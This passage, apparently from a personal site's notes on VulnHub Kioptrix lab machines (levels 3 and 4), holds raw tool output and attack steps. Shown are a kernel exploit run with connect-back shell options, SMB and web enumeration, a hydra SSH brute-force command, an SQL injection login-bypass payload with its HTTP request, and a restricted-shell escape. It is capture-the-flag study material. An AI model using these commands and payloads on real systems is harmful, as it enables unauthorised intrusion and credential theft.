Building dependency tree Reading state information... Done The following packages were automatically installed and are no longer required: libayatana-ido3-0.4-0 libbfio1 libdvdread4 libhogweed4 libhwloc5 libisl21 libjim0.77 libjte1 libnettle6 libobjc-9-dev python-magic python-paramiko python-pefile python-qrcode Use 'apt autoremove' to remove them. The following additional packages will be installed: libsctp1 Suggested packages: lksctp-tools The following NEW packages will be installed: Get:1 http://ftp1.nluug.nl/os/Linux/distr/kali kali-rolling/main amd64 libsctp1 amd64 1.0.18+dfsg-1 [28.3 kB] Get:2 http://ftp2.nluug.nl/os/Linux/distr/kali kali-rolling/main amd64 libsctp-dev amd64 1.0.18+dfsg-1 [81.5 kB] Fetched 110 kB in 1s (153 kB/s) Selecting previously unselected package libsctp1:amd64. (Reading database ... 311290 files and directories currently installed.)....................................................................................................................................................................................................................................................................................................................................] Preparing to unpack .../libsctp1_1.0.18+dfsg-1_amd64.deb ... Unpacking libsctp1:amd64 (1.0.18+dfsg-1) ... Selecting previously unselected package libsctp-dev:amd64. Preparing to unpack .../libsctp-dev_1.0.18+dfsg-1_amd64.deb ... Unpacking libsctp-dev:amd64 (1.0.18+dfsg-1) ... Setting up libsctp1:amd64 (1.0.18+dfsg-1) ... Setting up libsctp-dev:amd64 (1.0.18+dfsg-1) ... Processing triggers for man-db (2.9.0-2) ... Processing triggers for libc-bin (2.29-3) ... root@kali:~/kioptrix/level3# gcc 8556.c -o 8556 root@kali:~/kioptrix/level3# chmod +x 8556 root@kali:~/kioptrix/level3# ./8556 ./sctp_houdini -H lhost (local host address for connect back shel) -P lport (local port address for connect back shell) -h rhost (remote target host) -p rport (remote target port) -t kernel (target kernel) -s sport (source port defining sctp association where corruption occurs) (always use higher port if you run the exploit multiple times eg. 20000, 21000, etc..) (NEVER reuse the same or next port or vsys will be trashed and init will die soon...) -c conn (number of connectionis before corruption - default 600) ./8556 -H 192.168.88.128 -P 4444 -h 192.168.88.131 -p 80 -t a -s 20000 Unable to find target: a Available targets are: - ubuntu64_faisty-2.6.20-[15-17]-generic (faisty: generic kernel) - ubuntu64_faisty-2.6.20-17-server (faisty: server kernel - last 2.6.20-17 build) - ubuntu64_hardy-2.6.24-[18-21]-generic (kernel from 2.6.24-18 to kernel 2.6.24-21 -- generic) - ubuntu64_hardy_2.6.24-[16-18]-server (kernel from 2.6.24-16 to 2.6.24-18 -- server) - ubuntu64_hardy-2.6.24-[19-22]-server (kernel from 2.6.24-19 to 2.6.24-22 -- server) - ubuntu64_hardy-2.6.24-23-last-server (last 2.6.24-23 kernel before patch -- server) - ubuntu64_intrepid-2.6.27-7-server (kernel 2.6.27-7 -- server) - ubuntu64_intrepid-2.6.27-[9-last]-server (kernel 2.6.27-9 to the last unpatched kernel -- server) - ubuntu64_intrepid-2.6.27-[7-last]-generic (kernel 2.6.27-9 to the last unpatched kernel -- server) - fedora64_10-2.6.25-117 (fedora core 10 default installed kernel) - opensuse64_11.1-2.6.27.7-9-default (opensuse 11.1 default installed kernel)  Doenst work on our kernel, latest supported is ubuntu64_hardy-2.6.24-23-last-server\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/vulnhub/kioptrix/level4/",
	"title": "Level 4",
	"tags": ["VulnHub"],
	"description": "Notes from Kioptrix level 4 from Vulnhub.",
	"content": "level4    Proto port Service/URL Info Potential Vulns Verified Vulns       system Ubuntu 8.04.3 LTS Linux 2.6.24-24 Workgroup: WORKGROUP Domain: localdomain FQDN: Kioptrix4.localdomain Account Lockout Threshold: None Users: nobody,robert,root,john,loneferret  dirty cow dirty cow   TCP 22 ssh OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)      TCP 80 http Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)      UDP 137 netbios-ns Microsoft Windows netbios-ns (workgroup: WORKGROUP)     TCP 139 netbios-ssn Samba smbd 3.X - 4.X      TCP 445 netbios-ssn Samba smbd 3.0.28a print$ - no access IPC$ - Anonymous access        mysql Running as root. User-Defined Function (UDF) Dynamic Library (2) UDF    Enum Where you at nmap -sn -PR 192.168.88.0/24 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 17:15 CET Nmap scan report for 192.168.88.2 Host is up (0.000070s latency). MAC Address: 00:50:56:FE:4E:C1 (VMware) Nmap scan report for 192.168.88.132 Host is up (0.00037s latency). MAC Address: 00:0C:29:F2:50:A8 (VMware) Nmap scan report for 192.168.88.254 Host is up (0.00011s latency). MAC Address: 00:50:56:F7:8F:D0 (VMware) Nmap scan report for 192.168.88.128 Host is up. Nmap done: 256 IP addresses (4 hosts up) scanned in 1.78 seconds  TCP nmap -p- -A 192.168.88.132 -oA tcp Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 17:16 CET Nmap scan report for 192.168.88.132 Host is up (0.00046s latency). Not shown: 39528 closed ports, 26003 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0) | ssh-hostkey: | 1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA) |_ 2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA) 80/tcp open http Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch) |_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch |_http-title: Site doesnt have a title (text/html). 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP) MAC Address: 00:0C:29:F2:50:A8 (VMware) Device type: general purpose Running: Linux 2.6.X OS CPE: cpe:/o:linux:linux_kernel:2.6 OS details: Linux 2.6.9 - 2.6.33 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 2h30m02s, deviation: 3h32m07s, median: 2s |_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb-os-discovery: | OS: Unix (Samba 3.0.28a) | Computer name: Kioptrix4 | NetBIOS computer name: | Domain name: localdomain | FQDN: Kioptrix4.localdomain |_ System time: 2020-01-04T11:17:19-05:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) TRACEROUTE HOP RTT ADDRESS 1 0.46 ms 192.168.88.132 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 45.01 seconds  UDP Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 17:17 CET Stats: 0:10:22 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 67.18% done; ETC: 17:32 (0:05:03 remaining) Nmap scan report for 192.168.88.132 Host is up (0.00052s latency). Not shown: 951 closed ports, 48 open|filtered ports PORT STATE SERVICE VERSION 137/udp open netbios-ns Microsoft Windows netbios-ns (workgroup: WORKGROUP) MAC Address: 00:0C:29:F2:50:A8 (VMware) Too many fingerprints match this host to give specific OS details Network Distance: 1 hop Service Info: Host: KIOPTRIX4; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) TRACEROUTE HOP RTT ADDRESS 1 0.52 ms 192.168.88.132 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1353.84 seconds  192.168.88.132 - 80 gobuster ~/go/bin/gobuster dir -u http://192.168.88.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,sql -t 40 -e =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://192.168.88.132 [+] Threads: 40 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,html,txt,sql [+] Expanded: true [+] Timeout: 10s =============================================================== 2020/01/04 20:54:38 Starting gobuster =============================================================== http://192.168.88.132/images (Status: 301) http://192.168.88.132/index (Status: 200) http://192.168.88.132/index.php (Status: 200) http://192.168.88.132/member (Status: 302) http://192.168.88.132/member.php (Status: 302) http://192.168.88.132/database.sql (Status: 200) http://192.168.88.132/logout (Status: 302) http://192.168.88.132/logout.php (Status: 302) http://192.168.88.132/john (Status: 301) http://192.168.88.132/robert (Status: 301) http://192.168.88.132/server-status (Status: 403) =============================================================== 2020/01/04 20:55:52 Finished ===============================================================  http://192.168.88.132/database.sql\nCREATE TABLE `members` ( `id` int(4) NOT NULL auto_increment, `username` varchar(65) NOT NULL default '', `password` varchar(65) NOT NULL default '', PRIMARY KEY (`id`) ) TYPE=MyISAM AUTO_INCREMENT=2 ; -- -- Dumping data for table `members` -- INSERT INTO `members` VALUES (1, 'john', '1234');  192.168.88.132 - 139/445 smbclient smbclient -L \\\\\\\\192.168.88.132\\\\ Enter WORKGROUP\\root's password: Anonymous login successful Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers IPC$ IPC IPC Service (Kioptrix4 server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. Anonymous login successful Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP KIOPTRIX4  smbclient \\\\\\\\192.168.88.132\\\\IPC$ Enter WORKGROUP\\root's password: Anonymous login successful Try \u0026quot;help\u0026quot; to get a list of possible commands. smb: \\\u0026gt; ls NT_STATUS_NETWORK_ACCESS_DENIED listing \\*  smbclient \\\\\\\\192.168.88.132\\\\print$ Enter WORKGROUP\\root's password: Anonymous login successful tree connect failed: NT_STATUS_ACCESS_DENIED  enum4linux Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jan 4 20:15:14 2020 ========================== | Target Information | ========================== Target ........... 192.168.88.132 RID Range ........ 500-550,1000-1050 Username ......... '' Password ......... '' Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ====================================================== | Enumerating Workgroup/Domain on 192.168.88.132 | ====================================================== [+] Got domain/workgroup name: WORKGROUP ============================================== | Nbtstat Information for 192.168.88.132 | ============================================== Looking up status of 192.168.88.132 KIOPTRIX4 \u0026lt;00\u0026gt; - B \u0026lt;ACTIVE\u0026gt; Workstation Service KIOPTRIX4 \u0026lt;03\u0026gt; - B \u0026lt;ACTIVE\u0026gt; Messenger Service KIOPTRIX4 \u0026lt;20\u0026gt; - B \u0026lt;ACTIVE\u0026gt; File Server Service ..__MSBROWSE__. \u0026lt;01\u0026gt; - \u0026lt;GROUP\u0026gt; B \u0026lt;ACTIVE\u0026gt; Master Browser WORKGROUP \u0026lt;1d\u0026gt; - B \u0026lt;ACTIVE\u0026gt; Master Browser WORKGROUP \u0026lt;1e\u0026gt; - \u0026lt;GROUP\u0026gt; B \u0026lt;ACTIVE\u0026gt; Browser Service Elections WORKGROUP \u0026lt;00\u0026gt; - \u0026lt;GROUP\u0026gt; B \u0026lt;ACTIVE\u0026gt; Domain/Workgroup Name MAC Address = 00-00-00-00-00-00 ======================================= | Session Check on 192.168.88.132 | ======================================= [+] Server 192.168.88.132 allows sessions using username '', password '' ============================================= | Getting domain SID for 192.168.88.132 | ============================================= Domain Name: WORKGROUP Domain Sid: (NULL SID) [+] Cant determine if host is part of domain or part of a workgroup ======================================== | OS information on 192.168.88.132 | ======================================== Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464. [+] Got OS info for 192.168.88.132 from smbclient: [+] Got OS info for 192.168.88.132 from srvinfo: KIOPTRIX4 Wk Sv PrQ Unx NT SNT Kioptrix4 server (Samba, Ubuntu) platform_id : 500 os version : 4.9 server type : 0x809a03 =============================== | Users on 192.168.88.132 | =============================== index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody Name: nobody Desc: (null) index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert Name: ,,, Desc: (null) index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root Name: root Desc: (null) index: 0x4 RID: 0xbba acb: 0x00000010 Account: john Name: ,,, Desc: (null) index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret Name: loneferret,,, Desc: (null) user:[nobody] rid:[0x1f5] user:[robert] rid:[0xbbc] user:[root] rid:[0x3e8] user:[john] rid:[0xbba] user:[loneferret] rid:[0xbb8] =========================================== | Share Enumeration on 192.168.88.132 | =========================================== Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers IPC$ IPC IPC Service (Kioptrix4 server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP KIOPTRIX4 [+] Attempting to map shares on 192.168.88.132 //192.168.88.132/print$ Mapping: DENIED, Listing: N/A //192.168.88.132/IPC$ [E] Cant understand response: NT_STATUS_NETWORK_ACCESS_DENIED listing \\* ====================================================== | Password Policy Information for 192.168.88.132 | ====================================================== [+] Attaching to 192.168.88.132 using a NULL share [+] Trying protocol 445/SMB... [+] Found domain(s): [+] KIOPTRIX4 [+] Builtin [+] Password Info for Domain: KIOPTRIX4 [+] Minimum password length: 5 [+] Password history length: None [+] Maximum password age: Not Set [+] Password Complexity Flags: 000000 [+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 0 [+] Minimum password age: None [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Duration: 30 minutes [+] Account Lockout Threshold: None [+] Forced Log off Time: Not Set [+] Retieved partial password policy with rpcclient: Password Complexity: Disabled Minimum Password Length: 0 ================================ | Groups on 192.168.88.132 | ================================ [+] Getting builtin groups: [+] Getting builtin group memberships: [+] Getting local groups: [+] Getting local group memberships: [+] Getting domain groups: [+] Getting domain group memberships: ========================================================================= | Users on 192.168.88.132 via RID cycling (RIDS: 500-550,1000-1050) | ========================================================================= [I] Found new SID: S-1-5-21-2529228035-991147148-3991031631 [I] Found new SID: S-1-22-1 [I] Found new SID: S-1-5-32 [+] Enumerating users using SID S-1-5-32 and logon username '', password '' S-1-5-32-500 *unknown*\\*unknown* (8) S-1-5-32-501 *unknown*\\*unknown* (8) S-1-5-32-502 *unknown*\\*unknown* (8) S-1-5-32-503 *unknown*\\*unknown* (8) S-1-5-32-504 *unknown*\\*unknown* (8) S-1-5-32-505 *unknown*\\*unknown* (8) S-1-5-32-506 *unknown*\\*unknown* (8) S-1-5-32-507 *unknown*\\*unknown* (8) S-1-5-32-508 *unknown*\\*unknown* (8) S-1-5-32-509 *unknown*\\*unknown* (8) S-1-5-32-510 *unknown*\\*unknown* (8) S-1-5-32-511 *unknown*\\*unknown* (8) S-1-5-32-512 *unknown*\\*unknown* (8) S-1-5-32-513 *unknown*\\*unknown* (8) S-1-5-32-514 *unknown*\\*unknown* (8) S-1-5-32-515 *unknown*\\*unknown* (8) S-1-5-32-516 *unknown*\\*unknown* (8) S-1-5-32-517 *unknown*\\*unknown* (8) S-1-5-32-518 *unknown*\\*unknown* (8) S-1-5-32-519 *unknown*\\*unknown* (8) S-1-5-32-520 *unknown*\\*unknown* (8) S-1-5-32-521 *unknown*\\*unknown* (8) S-1-5-32-522 *unknown*\\*unknown* (8) S-1-5-32-523 *unknown*\\*unknown* (8) S-1-5-32-524 *unknown*\\*unknown* (8) S-1-5-32-525 *unknown*\\*unknown* (8) S-1-5-32-526 *unknown*\\*unknown* (8) S-1-5-32-527 *unknown*\\*unknown* (8) S-1-5-32-528 *unknown*\\*unknown* (8) S-1-5-32-529 *unknown*\\*unknown* (8) S-1-5-32-530 *unknown*\\*unknown* (8) S-1-5-32-531 *unknown*\\*unknown* (8) S-1-5-32-532 *unknown*\\*unknown* (8) S-1-5-32-533 *unknown*\\*unknown* (8) S-1-5-32-534 *unknown*\\*unknown* (8) S-1-5-32-535 *unknown*\\*unknown* (8) S-1-5-32-536 *unknown*\\*unknown* (8) S-1-5-32-537 *unknown*\\*unknown* (8) S-1-5-32-538 *unknown*\\*unknown* (8) S-1-5-32-539 *unknown*\\*unknown* (8) S-1-5-32-540 *unknown*\\*unknown* (8) S-1-5-32-541 *unknown*\\*unknown* (8) S-1-5-32-542 *unknown*\\*unknown* (8) S-1-5-32-543 *unknown*\\*unknown* (8) S-1-5-32-544 BUILTIN\\Administrators (Local Group) S-1-5-32-545 BUILTIN\\Users (Local Group) S-1-5-32-546 BUILTIN\\Guests (Local Group) S-1-5-32-547 BUILTIN\\Power Users (Local Group) S-1-5-32-548 BUILTIN\\Account Operators (Local Group) S-1-5-32-549 BUILTIN\\Server Operators (Local Group) S-1-5-32-550 BUILTIN\\Print Operators (Local Group) S-1-5-32-1000 *unknown*\\*unknown* (8) S-1-5-32-1001 *unknown*\\*unknown* (8) S-1-5-32-1002 *unknown*\\*unknown* (8) S-1-5-32-1003 *unknown*\\*unknown* (8) S-1-5-32-1004 *unknown*\\*unknown* (8) S-1-5-32-1005 *unknown*\\*unknown* (8) S-1-5-32-1006 *unknown*\\*unknown* (8) S-1-5-32-1007 *unknown*\\*unknown* (8) S-1-5-32-1008 *unknown*\\*unknown* (8) S-1-5-32-1009 *unknown*\\*unknown* (8) S-1-5-32-1010 *unknown*\\*unknown* (8) S-1-5-32-1011 *unknown*\\*unknown* (8) S-1-5-32-1012 *unknown*\\*unknown* (8) S-1-5-32-1013 *unknown*\\*unknown* (8) S-1-5-32-1014 *unknown*\\*unknown* (8) S-1-5-32-1015 *unknown*\\*unknown* (8) S-1-5-32-1016 *unknown*\\*unknown* (8) S-1-5-32-1017 *unknown*\\*unknown* (8) S-1-5-32-1018 *unknown*\\*unknown* (8) S-1-5-32-1019 *unknown*\\*unknown* (8) S-1-5-32-1020 *unknown*\\*unknown* (8) S-1-5-32-1021 *unknown*\\*unknown* (8) S-1-5-32-1022 *unknown*\\*unknown* (8) S-1-5-32-1023 *unknown*\\*unknown* (8) S-1-5-32-1024 *unknown*\\*unknown* (8) S-1-5-32-1025 *unknown*\\*unknown* (8) S-1-5-32-1026 *unknown*\\*unknown* (8) S-1-5-32-1027 *unknown*\\*unknown* (8) S-1-5-32-1028 *unknown*\\*unknown* (8) S-1-5-32-1029 *unknown*\\*unknown* (8) S-1-5-32-1030 *unknown*\\*unknown* (8) S-1-5-32-1031 *unknown*\\*unknown* (8) S-1-5-32-1032 *unknown*\\*unknown* (8) S-1-5-32-1033 *unknown*\\*unknown* (8) S-1-5-32-1034 *unknown*\\*unknown* (8) S-1-5-32-1035 *unknown*\\*unknown* (8) S-1-5-32-1036 *unknown*\\*unknown* (8) S-1-5-32-1037 *unknown*\\*unknown* (8) S-1-5-32-1038 *unknown*\\*unknown* (8) S-1-5-32-1039 *unknown*\\*unknown* (8) S-1-5-32-1040 *unknown*\\*unknown* (8) S-1-5-32-1041 *unknown*\\*unknown* (8) S-1-5-32-1042 *unknown*\\*unknown* (8) S-1-5-32-1043 *unknown*\\*unknown* (8) S-1-5-32-1044 *unknown*\\*unknown* (8) S-1-5-32-1045 *unknown*\\*unknown* (8) S-1-5-32-1046 *unknown*\\*unknown* (8) S-1-5-32-1047 *unknown*\\*unknown* (8) S-1-5-32-1048 *unknown*\\*unknown* (8) S-1-5-32-1049 *unknown*\\*unknown* (8) S-1-5-32-1050 *unknown*\\*unknown* (8) [+] Enumerating users using SID S-1-22-1 and logon username '', password '' S-1-22-1-1000 Unix User\\loneferret (Local User) S-1-22-1-1001 Unix User\\john (Local User) S-1-22-1-1002 Unix User\\robert (Local User) [+] Enumerating users using SID S-1-5-21-2529228035-991147148-3991031631 and logon username '', password '' S-1-5-21-2529228035-991147148-3991031631-500 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-501 KIOPTRIX4\\nobody (Local User) S-1-5-21-2529228035-991147148-3991031631-502 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-503 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-504 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-505 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-506 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-507 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-508 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-509 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-510 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-511 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-512 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-513 KIOPTRIX4\\None (Domain Group) S-1-5-21-2529228035-991147148-3991031631-514 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-515 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-516 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-517 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-518 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-519 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-520 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-521 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-522 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-523 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-524 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-525 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-526 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-527 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-528 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-529 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-530 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-531 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-532 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-533 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-534 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-535 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-536 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-537 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-538 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-539 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-540 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-541 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-542 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-543 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-544 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-545 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-546 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-547 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-548 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-549 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-550 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1000 KIOPTRIX4\\root (Local User) S-1-5-21-2529228035-991147148-3991031631-1001 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1002 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1003 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1004 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1005 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1006 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1007 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1008 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1009 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1010 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1011 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1012 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1013 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1014 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1015 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1016 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1017 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1018 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1019 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1020 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1021 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1022 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1023 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1024 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1025 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1026 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1027 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1028 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1029 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1030 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1031 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1032 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1033 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1034 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1035 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1036 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1037 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1038 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1039 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1040 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1041 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1042 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1043 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1044 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1045 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1046 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1047 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1048 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1049 *unknown*\\*unknown* (8) S-1-5-21-2529228035-991147148-3991031631-1050 *unknown*\\*unknown* (8) =============================================== | Getting printer info for 192.168.88.132 | =============================================== No printers returned. enum4linux complete on Sat Jan 4 20:15:51 2020  Expliot brute-Force user list: john robert loneferret root nobody hydra -v -V -L users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.88.129 ssh -t 8 .... 1 of 1 target completed, 0 valid passwords found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-04 22:09:17  SQLi/Auth bypass http://192.168.88.132/checklogin.php\nuser: someuser pass: ' OR \u0026lsquo;1'='1\u0026rsquo; #\u0026ndash;\nPOST /checklogin.php HTTP/1.1 Host: 192.168.88.132 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://192.168.88.132/index.php Content-Type: application/x-www-form-urlencoded Content-Length: 71 Connection: close Cookie: PHPSESSID=f3422deb5013adf1dd1883936619abbf Upgrade-Insecure-Requests: 1 myusername=admin\u0026amp;mypassword=%27+OR+%271%27%3D%271%27+%23--\u0026amp;Submit=Login  user: robert pass: ' OR \u0026lsquo;1'='1\u0026rsquo; #\u0026ndash;\nMember\u0026rsquo;s Control Panel\nUsername : robert\nPassword : ADGAdsafdfwt4gadfga==\nSSH Escape ssh robert@192.168.88.132 robert@192.168.88.132's password: Welcome to LigGoat Security Systems - We are Watching == Welcome LigGoat Employee == LigGoat Shell is in place so you don't screw up Type '?' or 'help' to get the list of allowed commands robert:~$ echo os.system(\u0026quot;/bin/bash\u0026quot;)  robert@Kioptrix4:~$ robert@Kioptrix4:~$ cat 